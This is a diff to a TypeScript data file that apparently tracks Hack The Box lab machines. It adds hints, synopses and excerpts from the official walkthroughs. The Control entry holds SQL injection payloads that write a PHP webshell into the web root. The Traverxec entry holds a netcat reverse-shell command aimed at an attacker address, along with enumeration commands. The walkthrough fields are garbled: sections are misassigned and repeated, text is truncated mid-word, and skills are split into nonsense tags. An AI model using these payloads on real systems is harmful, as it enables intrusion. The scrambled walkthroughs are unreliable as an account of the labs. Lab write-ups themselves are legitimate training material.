+    "officialWalkthrough": "### 📋 Official Synopsis\nNest is an easy difficulty Windows machine featuring an SMB server that permits guest access. The shares can be enumerated to gain credentials for a low privileged user. This user is found to have access to configuration files containing sensitive information. Another user's password is found through source code analysis, which is used to gain a foothold on the box. A custom service is found to be running, which is enumerated to find and decrypt Administrator credentials.\n\n### 🎯 Core Skills\n- **.NET Development**\n\n### ⚔️ Foothold Vector\non the box. A custom service is found to be running, which is enumerated to find and decrypt Administrator credentials. Skills Required Enumeration Source Code Review Skills Learned .NET Development SMB Enumeration Enumeration Nmap Nmap reports that SMB (port 445) is available, as well as an unknown Reporting Service running on port 4386. SMB Let's check if the SMB server allows null sessions using SMBMap. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.178 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.10.10.178 We were able to connect successfully and discover the three non-default shares Secure$ , Users and Data .\n\n### 👑 Privilege Escalation\nThe folder contains an XML file as well as a binary, which are downloaded. The XML file contains the following information. It appears to be a configuration file for the service running on port 4386 that we came across earlier. Let's connect to this service. The service allows us to run queries against a database. <?xml version=\"1.0\"?> <ServiceSettings xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"> <Port>4386</Port> <QueryDirectory>C:\\Program Files\\HQK\\ALL QUERIES</QueryDirectory> </ServiceSettings> The LIST command lists the files in the directory, while SETDIR lets us change the directory."
   },
   {
     "id": "htb-patents",
@@ -8228,15 +9666,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "OOB-XXE",
+      "based"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/patents",
     "writeupUrl": "https://0xdf.gitlab.io/tags#patents",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "Patents is a hard difficulty Linux machine featuring a \"Patents Management\" application running on Apache. File and folder",
     "timeSpentSeconds": 0,
     "createdAt": "2020-01-18T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Patents is a hard difficulty Linux machine featuring a \"Patents Management\" application running on Apache. File and folder",
+    "skillsLearned": [
+      "OOB XXE",
+      "based"
+    ],
+    "officialPdf": "224-Patents_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nPatents is a hard difficulty Linux machine featuring a \"Patents Management\" application running on Apache. File and folder\n\n### 🎯 Core Skills\n- **OOB XXE**\n- **based**\n\n### ⚔️ Foothold Vector\nFile System Enumeration Enumeration Nmap The Nmap scan reveals that SSH and Apache are running on their common ports. Apache Browsing to port 80 returns a page titled MEOW Inc. . The sidebar contains a menu item to upload a patent, which takes us to an upload page. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.173 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.10.10.173 The page accepts a Word document (modern .docx format) and converts it into a PDF. Gobuster Let's run gobuster to enumerate files and folder on the server. Gobuster discovered some interesting files such as config.php and convert.php .\n\n### 👑 Privilege Escalation\n. Skills Required Enumeration Reversing Engineering Exploit Development Skills Learned OOB XXE ROP-based Exploitation File System Enumeration Enumeration Nmap The Nmap scan reveals that SSH and Apache are running on their common ports. Apache Browsing to port 80 returns a page titled MEOW Inc. . The sidebar contains a menu item to upload a patent, which takes us to an upload page. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.173 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.10.10.173 The page accepts a Word document (modern .docx format) and converts it into a PDF. Gobuster Let's run gobuster to enumerate files and folder on the server."
   },
   {
     "id": "htb-openadmin",
@@ -8252,10 +9699,13 @@ export const INITIAL_MACHINES: Machine[] = [
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/openadmin",
     "writeupUrl": "https://0xdf.gitlab.io/tags#openadmin",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "OpenAdmin is an easy difficulty Linux machine that features an outdated OpenNetAdmin CMS instance. The CMS is exploited to gain a foothold, and subsequent",
     "timeSpentSeconds": 0,
     "createdAt": "2020-01-04T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "OpenAdmin is an easy difficulty Linux machine that features an outdated OpenNetAdmin CMS instance. The CMS is exploited to gain a foothold, and subsequent",
+    "officialPdf": "222-OpenAdmin_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nOpenAdmin is an easy difficulty Linux machine that features an outdated OpenNetAdmin CMS instance. The CMS is exploited to gain a foothold, and subsequent\n\n### ⚔️ Foothold Vector\n, and subsequent enumeration reveals database credentials. These credentials are reused to move laterally to a low privileged user. This user is found to have access to a restricted internal application. Examination of this application reveals credentials that are used to move laterally to a second user. A sudo misconfiguration is then exploited to gain a\n\n### 👑 Privilege Escalation\nshell. Skills Required Enumeration Port Forwarding Code Review Skills Learned Web Exploitation Password Cracking Nano Sudo Exploitation Enumeration Nmap The Nmap scan reveals SSH and Apache to be running on their usual ports. Apache Browsing to port 80, the default Apache page is seen. FFUF Let's enumerate files and folders on the server using ffuf. nmap -p- -Pn --min-rate=10000 -sV -sC 10.10.10.171 ffuf -u http://10.10.10.171/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,204,301,302,307,401 -o results.txt We discovered a few folders named music, artwork and sierra . The python script below can be used to scrape the navigation links from the pages present in results.txt ."
   },
   {
     "id": "htb-playertwo",
@@ -8266,15 +9716,26 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Insane",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Heap",
+      "MQTT",
+      "Twirp-and-Protobuf"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/playertwo",
     "writeupUrl": "https://0xdf.gitlab.io/tags#playertwo",
-    "hint": "Hack The Box Linux machine. Rated Insane difficulty.",
+    "hint": "PlayerTwo is an insane difficulty Linux machine featuring multiple technologies and vulnerabilities. Vhost and directory",
     "timeSpentSeconds": 0,
     "createdAt": "2019-12-14T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "PlayerTwo is an insane difficulty Linux machine featuring multiple technologies and vulnerabilities. Vhost and directory",
+    "skillsLearned": [
+      "Twirp and Protobuf",
+      "MQTT",
+      "Heap"
+    ],
+    "officialPdf": "221-PlayerTwo_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nPlayerTwo is an insane difficulty Linux machine featuring multiple technologies and vulnerabilities. Vhost and directory\n\n### 🎯 Core Skills\n- **Twirp and Protobuf**\n- **MQTT**\n- **Heap**\n\n### ⚔️ Foothold Vector\n. The server is found to be passing messages over MQTT, and contain a user's SSH key. This user is found to have access to a SUID binary that is vulnerable to multiple vectors, leading to a\n\n### 👑 Privilege Escalation\nshell. Skills Required Web Enumeration Scripting Reverse Engineering Exploit Development Skills Learned Twirp and Protobuf MQTT Heap Exploitation Enumeration Nmap Nmap reveals three open ports corresponding to SSH (22), Apache (80) and a PHP built-in server (8545) respectively. The script scan of port 8545 resulted in an error message containing the string twirp_invalid_route . Looking up this error bring us to Twirp, which is an RPC framework that facilitates service-to-service interaction. Apache Browsing to port 80 reveals an image describing an error. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.170 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.10."
   },
   {
     "id": "htb-obscurity",
@@ -8285,15 +9746,26 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Known",
+      "Plaintext-Attack",
+      "Source-Code-Review"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/obscurity",
     "writeupUrl": "https://0xdf.gitlab.io/tags#obscurity",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Obscurity is medium difficulty Linux machine that features a custom web server. A code injection vulnerability is exploited to gain an initial foothold as www-data .",
     "timeSpentSeconds": 0,
     "createdAt": "2019-11-30T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Obscurity is medium difficulty Linux machine that features a custom web server. A code injection vulnerability is exploited to gain an initial foothold as www-data . Weak folder permissions reveal a custom cryptography algorithm, that has been used to encrypt the user's password. A known- plaintext attack reveals the encryption key, which is used to decrypt the password. This password is used to move laterally to the user robert , who is allowed to run a faux terminal as root. This can be used to escalate privileges to root via winning a race condition or by overwriting sudo arguments.",
+    "skillsLearned": [
+      "Source Code Review",
+      "Known",
+      "Plaintext Attack"
+    ],
+    "officialPdf": "219-Obscurity_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nObscurity is medium difficulty Linux machine that features a custom web server. A code injection vulnerability is exploited to gain an initial foothold as www-data . Weak folder permissions reveal a custom cryptography algorithm, that has been used to encrypt the user's password. A known- plaintext attack reveals the encryption key, which is used to decrypt the password. This password is used to move laterally to the user robert , who is allowed to run a faux terminal as root. This can be used to escalate privileges to root via winning a race condition or by overwriting sudo arguments.\n\n### 🎯 Core Skills\n- **Source Code Review**\n- **Known**\n- **Plaintext Attack**\n\n### ⚔️ Foothold Vector\nas www-data . Weak folder permissions reveal a custom cryptography algorithm, that has been used to encrypt the user's password. A known- plaintext attack reveals the encryption key, which is used to decrypt the password. This password is used to move laterally to the user robert , who is allowed to run a faux terminal as\n\n### 👑 Privilege Escalation\n. This can be used to escalate privileges to root via winning a race condition or by overwriting sudo arguments. Skills Required Basic Linux Enumeration Skills Learned Source Code Review Known-Plaintext Attack Enumeration Nmap shows that SSH is available on its default port, as well as a web server called BadHTTPServer on port 8080, serving a page titled Obscura . Inspection of this page in a browser reveals a site for a security focused software company. Their suite of products include the BadHTTPServer web server, an encryption algorithm and an SSH replacement. A message on the website discloses the file name of the web server, and that it's in a secret development directory."
   },
   {
     "id": "htb-control",
@@ -8304,15 +9776,27 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Basic-SQL-Injection",
+      "CVE-2019-11043",
+      "File-System",
+      "HTB",
+      "Hash-Cracking"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/control",
     "writeupUrl": "https://0xdf.gitlab.io/tags#control",
-    "hint": "Hack The Box Windows machine. Rated Hard difficulty.",
+    "hint": "Control is a hard difficulty Windows machine featuring a site that is found vulnerable to SQL injection. This is leveraged to extract MySQL user password hashes, and also to write a webshell and gain a foothold.",
     "timeSpentSeconds": 0,
     "createdAt": "2019-11-23T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Control is a hard difficulty Windows machine featuring a site that is found vulnerable to SQL injection. This is leveraged to extract MySQL user password hashes, and also to write a webshell and gain a foothold. The password hash for the SQL user hector is cracked, which is used to move laterally to their Windows account. Examination of the PowerShell history file reveals that the Registry permissions may have been modified. After enumerating Registry service permissions and other service properties, a service is abused to gain a shell as NT AUTHORITY\\SYSTEM .",
+    "skillsLearned": [
+      "Basic SQL Injection",
+      "Hash Cracking",
+      "File System"
+    ],
+    "officialPdf": "218-Control_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nControl is a hard difficulty Windows machine featuring a site that is found vulnerable to SQL injection. This is leveraged to extract MySQL user password hashes, and also to write a webshell and gain a foothold. The password hash for the SQL user hector is cracked, which is used to move laterally to their Windows account. Examination of the PowerShell history file reveals that the Registry permissions may have been modified. After enumerating Registry service permissions and other service properties, a service is abused to gain a shell as NT AUTHORITY\\SYSTEM .\n\n### 🎯 Core Skills\n- **Basic SQL Injection**\n- **Hash Cracking**\n- **File System**\n\n### 🛡️ Associated CVEs\n`CVE-2019-11043`\n\n### ⚔️ Foothold Vector\n. The password hash for the SQL user hector is cracked, which is used to move laterally to their Windows account. Examination of the PowerShell history file reveals that the Registry permissions may have been modified. After enumerating Registry service permissions and other service properties, a service is abused to gain a shell as NT AUTHORITY\\SYSTEM . Skills Required Basic knowledge of Windows Skills Learned Basic SQL Injection Hash Cracking File System Enumeration Service Enumeration Windows Defender Evasion Enumeration Nmap reveals MySQL and IIS running on their default ports. The IIS version is 10.0, which indicates that this is Windows Server 2016 or Windows Server 2019.\n\n### 👑 Privilege Escalation\n. Using Burp's Encoder module we can encode the mini webshell as ASCII hex. Next, we can attempt to use the LINES TERMINATED BY method to upload our webshell. test' UNION SELECT 1,2,3,4,GROUP_CONCAT(user,\" : \",file_priv,\"\\n\"),6 FROM mysql.user WHERE FILE_PRIV='Y'-- - <?=`$_GET[0]`?> test' LIMIT 1 INTO OUTFILE 'C:\\\\inetpub\\\\wwwroot\\\\product-453.php' LINES TERMINATED BY 0x3c3f3d60245f4745545b305d603f3e-- - This is successful, and have gained command execution on the server. Let's create a new share in order to host Netcat and other files as needed."
   },
   {
     "id": "htb-traverxec",
@@ -8323,15 +9807,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "GTFOBins",
+      "HTB",
+      "SSH-Key-Cracking"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/traverxec",
     "writeupUrl": "https://0xdf.gitlab.io/tags#traverxec",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Traverxec is an easy Linux machine that features a Nostromo Web Server, which is vulnerable to Remote Code Execution (RCE). The Web server configuration files lead us to SSH credentials, which allow us to move laterally to the user david .",
     "timeSpentSeconds": 0,
     "createdAt": "2019-11-16T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Traverxec is an easy Linux machine that features a Nostromo Web Server, which is vulnerable to Remote Code Execution (RCE). The Web server configuration files lead us to SSH credentials, which allow us to move laterally to the user david . A bash script in the user's home directory reveals that the user can execute journalctl as root. This is exploited to spawn a root shell.",
+    "skillsLearned": [
+      "SSH Key Cracking",
+      "GTFOBins"
+    ],
+    "officialPdf": "217-Traverxec_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nTraverxec is an easy Linux machine that features a Nostromo Web Server, which is vulnerable to Remote Code Execution (RCE). The Web server configuration files lead us to SSH credentials, which allow us to move laterally to the user david . A bash script in the user's home directory reveals that the user can execute journalctl as root. This is exploited to spawn a root shell.\n\n### 🎯 Core Skills\n- **SSH Key Cracking**\n- **GTFOBins**\n\n### ⚔️ Foothold Vector\nManual Exploitation A bit of research yields that nostromo version 1.9.6 has a Remote Code Execution vulnerability. Let's download the python exploit and execute it as follows. In order to get a reverse shell we can use Netcat. Let's start a Netcat listener on our local machine. Then execute the following command to get a shell. Metasploit We can also exploit the vulnerability using the Metasploit module. Let's start Metasploit and try to exploit it. The lhost and rhost values are set as required and the module is run. python exploit.py 10.10.10.165 80 id nc -lvp 1234 python exploit.py 10.10.10.165 80 \"nc -e bash 10.10.14.\n\n### 👑 Privilege Escalation\n. This is exploited to spawn a root shell. Skills Required Enumeration Metasploit Password Cracking Skills Learned SSH Key Cracking GTFOBins Enumeration Let's begin by running an Nmap scan. The scan reveals ports 22 and 80 to be open. Nmap reports the http-server-header to be nostromo 1.9.6 , which means that the box is running the Nostromo HTTP server. Nostromo Nostromo or nhttpd is an open source web server. The webpage does not seem to show anything interesting, and a Gobuster scan failed to find anything useful. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.165 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.10.10."
   },
   {
     "id": "htb-ai",
@@ -8342,15 +9835,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Debugging-with-JDWP",
+      "HTB",
+      "Speech-to-Text"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/ai",
     "writeupUrl": "https://0xdf.gitlab.io/tags#ai",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "AI is a medium difficulty Linux machine running a speech recognition service on Apache. This service is found to be vulnerable to SQL injection and is exploited with audio files.",
     "timeSpentSeconds": 0,
     "createdAt": "2019-11-09T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "AI is a medium difficulty Linux machine running a speech recognition service on Apache. This service is found to be vulnerable to SQL injection and is exploited with audio files. The injection is leveraged to gain SSH credentials for a user.",
+    "skillsLearned": [
+      "Debugging with JDWP",
+      "Speech to Text"
+    ],
+    "officialPdf": "216-AI_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nAI is a medium difficulty Linux machine running a speech recognition service on Apache. This service is found to be vulnerable to SQL injection and is exploited with audio files. The injection is leveraged to gain SSH credentials for a user.\n\n### 🎯 Core Skills\n- **Debugging with JDWP**\n- **Speech to Text**\n\n### ⚔️ Foothold Vector\nWe tried selecting the string hello world and the server returned it. This means that the table has just one column in it. Trying to form the correct query to find the table name might be complex and time consuming, as we would have to guess some table and column names. One common table name is users. Let's see if this table exists and if we can find any username. The server is unable to interpret our input properly. We can overcome this by adding pauses between words using commas. The injection worked and the first username is found to be alexa. Let's check if there's a password associated with this user. The password is returned as H,Sq9t6}a<)?q93_ .\n\n### 👑 Privilege Escalation\n. Skills Required Enumeration SQL Injection Java Classes Skills Learned Debugging with JDWP Speech to Text Enumeration Nmap SSH and Apache are found to be running on their usual ports. Apache Browsing to port 80, a website titled \"Artificial Intelligence\" is seen. The about page states that the developers are working on a voice recognition platform. Browsing to the AI page reveals an upload page for wav files. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.163 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.10.10.163 Trying to upload a normal test file returns the following output. Gobuster Let's enumerate files and folders on the server using gobuster."
   },
   {
     "id": "htb-postman",
@@ -8361,15 +9863,22 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Redis"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/postman",
     "writeupUrl": "https://0xdf.gitlab.io/tags#postman",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Postman is an easy difficulty Linux machine, which features a Redis server running without authentication. This service can be leveraged to write an SSH public key to the user's folder.",
     "timeSpentSeconds": 0,
     "createdAt": "2019-11-02T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Postman is an easy difficulty Linux machine, which features a Redis server running without authentication. This service can be leveraged to write an SSH public key to the user's folder. An encrypted SSH private key is found, which can be cracked to gain user access. The user is found to have a login for an older version of Webmin. This is exploited through command injection to gain root privileges.",
+    "skillsLearned": [
+      "Redis"
+    ],
+    "officialPdf": "215-Postman_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nPostman is an easy difficulty Linux machine, which features a Redis server running without authentication. This service can be leveraged to write an SSH public key to the user's folder. An encrypted SSH private key is found, which can be cracked to gain user access. The user is found to have a login for an older version of Webmin. This is exploited through command injection to gain root privileges.\n\n### 🎯 Core Skills\n- **Redis**\n\n### ⚔️ Foothold Vector\nWebmin Command Injection Enumeration Nmap SSH and Apache are running on their usual ports. Additionally, a Redis 4.0.9 instance is also found. Port 10000 hosts Webmin running on MiniServ 1.910 . Redis Redis versions between 4.0 and 5.0 are vulnerable to unauthenticated command execution and file writes. Detailed information on this vulnerability can be found in this presentation. Let's check if the server is vulnerable using redis-cli . We were able to connect and query the configuration, which reveals that it's possible to operate without authentication. nmap -p- -T4 --min-rate=1000 -sC -sV 10.10.10.160 Looking at the config, we find the default folder to be /var/lib/redis .\n\n### 👑 Privilege Escalation\nprivileges. Skills Required Enumeration Skills Learned Redis Exploitation Webmin Command Injection Enumeration Nmap SSH and Apache are running on their usual ports. Additionally, a Redis 4.0.9 instance is also found. Port 10000 hosts Webmin running on MiniServ 1.910 . Redis Redis versions between 4.0 and 5.0 are vulnerable to unauthenticated command execution and file writes. Detailed information on this vulnerability can be found in this presentation. Let's check if the server is vulnerable using redis-cli . We were able to connect and query the configuration, which reveals that it's possible to operate without authentication. nmap -p- -T4 --min-rate=1000 -sC -sV 10.10.10."
   },
   {
     "id": "htb-mango",
@@ -8380,15 +9889,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "GTFOBins-Abuse",
+      "HTB",
+      "NoSQL-Injection"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/mango",
     "writeupUrl": "https://0xdf.gitlab.io/tags#mango",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Mango is a medium difficulty Linux machine hosting a website that is found vulnerable to NoSQL injection. The NoSQL database is discovered to be MongoDB, from which we exfiltrate user credentials.",
     "timeSpentSeconds": 0,
     "createdAt": "2019-10-26T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Mango is a medium difficulty Linux machine hosting a website that is found vulnerable to NoSQL injection. The NoSQL database is discovered to be MongoDB, from which we exfiltrate user credentials. We can use one set of credentials to gain a foothold using SSH, and the other to move laterally within the box. A SUID binary is then exploited to escalate our privileges to root.",
+    "skillsLearned": [
+      "NoSQL Injection",
+      "GTFOBins Abuse"
+    ],
+    "officialPdf": "214-Mango_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nMango is a medium difficulty Linux machine hosting a website that is found vulnerable to NoSQL injection. The NoSQL database is discovered to be MongoDB, from which we exfiltrate user credentials. We can use one set of credentials to gain a foothold using SSH, and the other to move laterally within the box. A SUID binary is then exploited to escalate our privileges to root.\n\n### 🎯 Core Skills\n- **NoSQL Injection**\n- **GTFOBins Abuse**\n\n### ⚔️ Foothold Vector\nusing SSH, and the other to move laterally within the box. A SUID binary is then exploited to escalate our privileges to\n\n### 👑 Privilege Escalation\n. Skills Required Enumeration Scripting Skills Learned NoSQL Injection GTFOBins Abuse Enumeration Nmap The Nmap scan reveals ports 22, 80 and 443 running their usual services. Additionally, Nmap found a vhost named staging-order.mango.htb referred to in the SSL certificate. Let's add mango.htb and staging-order.mango.htb to /etc/hosts , and proceed with our enumeration. Apache Browsing to port 80 returns a 403 forbidden error, however, the HTTPS website reveals a search engine. The page just refreshes and doesn't return any results on searching. The second vhost is found to host the same page on HTTPS. However, the HTTP website reveals a login page. ports=$(nmap -p- --min-rate=1000 -T4 10."
   },
   {
     "id": "htb-registry",
@@ -8399,15 +9917,22 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
+      "Docker-API",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/registry",
     "writeupUrl": "https://0xdf.gitlab.io/tags#registry",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "Registry is a hard difficulty Linux machine, which features Docker and the Bolt CMS running on Nginx. Docker registry API access is configured with default credentials, which allows us to pull the repository files.",
     "timeSpentSeconds": 0,
     "createdAt": "2019-10-19T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Registry is a hard difficulty Linux machine, which features Docker and the Bolt CMS running on Nginx. Docker registry API access is configured with default credentials, which allows us to pull the repository files. Using the disclosed information it is possible to obtain an initial foothold. User credentials for Bolt CMS can be obtained, and exploiting the CMS provides us with access to the www-data user, who has a sudo entry to perform backups as root using the restic program. After taking a backup of the root folder remotely and mounting the repository with restic, the root flag is obtained.",
+    "skillsLearned": [
+      "Docker API"
+    ],
+    "officialPdf": "213-Registry_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nRegistry is a hard difficulty Linux machine, which features Docker and the Bolt CMS running on Nginx. Docker registry API access is configured with default credentials, which allows us to pull the repository files. Using the disclosed information it is possible to obtain an initial foothold. User credentials for Bolt CMS can be obtained, and exploiting the CMS provides us with access to the www-data user, who has a sudo entry to perform backups as root using the restic program. After taking a backup of the root folder remotely and mounting the repository with restic, the root flag is obtained.\n\n### 🎯 Core Skills\n- **Docker API**\n\n### ⚔️ Foothold Vector\n. User credentials for Bolt CMS can be obtained, and exploiting the CMS provides us with access to the www-data user, who has a sudo entry to perform backups as\n\n### 👑 Privilege Escalation\nusing the restic program. After taking a backup of the root folder remotely and mounting the repository with restic, the root flag is obtained. Skills Required Enumeration Port Forwarding Skills Learned Docker API Web Exploitation Restic Exploitation Enumeration Nmap SSH and Nginx are running on ports 22, 80 and 443 respectively. Nmap also reveals the Common Name docker.registry.htb from the SSL certificate. Nginx On browsing to ports 80 and 443 in a browser, we see default Nginx page. nmap -p- -Pn -sC -sV --min-rate=10000 10.10.10.159 We can add docker.registry.htb to our /etc/hosts and browse to it, which just shows an empty page."
   },
   {
     "id": "htb-sniper",
@@ -8418,15 +9943,29 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "LFI-and-RFI",
+      "Malicious-CHM-Creation",
+      "NetNTLM",
+      "PHP-Session-File-Abuse"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/sniper",
     "writeupUrl": "https://0xdf.gitlab.io/tags#sniper",
-    "hint": "Hack The Box Windows machine. Rated Medium difficulty.",
+    "hint": "Sniper is a medium difficulty Windows machine which features a PHP server. The server hosts a file that is found vulnerable to local and remote file inclusion.",
     "timeSpentSeconds": 0,
     "createdAt": "2019-10-05T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Sniper is a medium difficulty Windows machine which features a PHP server. The server hosts a file that is found vulnerable to local and remote file inclusion. Command execution is gained on the server in the context of NT AUTHORITY\\iUSR via local inclusion of maliciously crafted PHP Session files. Exposed database credentials are used to gain access as the user Chris , who has the same password.",
+    "skillsLearned": [
+      "LFI and RFI",
+      "PHP Session File Abuse",
+      "Malicious CHM Creation",
+      "NetNTLM",
+      "v2 Hash Capture and Cracking"
+    ],
+    "officialPdf": "211-Sniper_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nSniper is a medium difficulty Windows machine which features a PHP server. The server hosts a file that is found vulnerable to local and remote file inclusion. Command execution is gained on the server in the context of NT AUTHORITY\\iUSR via local inclusion of maliciously crafted PHP Session files. Exposed database credentials are used to gain access as the user Chris , who has the same password.\n\n### 🎯 Core Skills\n- **LFI and RFI**\n- **PHP Session File Abuse**\n- **Malicious CHM Creation**\n- **NetNTLM**\n- **v2 Hash Capture and Cracking**\n\n### ⚔️ Foothold Vector\nLocal File Inclusion After navigating to the blog page and changing the language, we see the following URL. Since the page uses a GET parameter to load a page it would be a good idea to test for a Local File Inclusion. Usually we can use ../ to load files from different directories. In windows the default web directory is C:\\inetpub\\www\n\n### 👑 Privilege Escalation\n. As we are in the blog subdirectory the path would be C:\\inetpub\\wwwroot\\blog\\ . In order to traverse up three directories and load the Windows Initialization file from C:\\Windows\\win.ini we can input the following. However, this is unsuccessful. Instead, let's try again, specifying the absolute path. Using Curl to load the above web page, we can view the ini file at the bottom of the page. Session Cookie We need to find a way to upgrade from LFI to RCE. After searching, we come across this blog post. Let's see what the user session file contains. First of all we will have to register as a new user, for instance Email: test@test.test / Username: guest / Password: guest and login. http://10."
   },
   {
     "id": "htb-json",
@@ -8437,15 +9976,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Using-ysoserial.net",
+      "dnSpy"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/json",
     "writeupUrl": "https://0xdf.gitlab.io/tags#json",
-    "hint": "Hack The Box Windows machine. Rated Medium difficulty.",
+    "hint": "JSON is a medium difficulty Windows machine running an IIS server with an ASP.NET application. The application is found to be vulnerable to .NET deserialization, which is exploited using ysoserial.net.",
     "timeSpentSeconds": 0,
     "createdAt": "2019-09-28T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
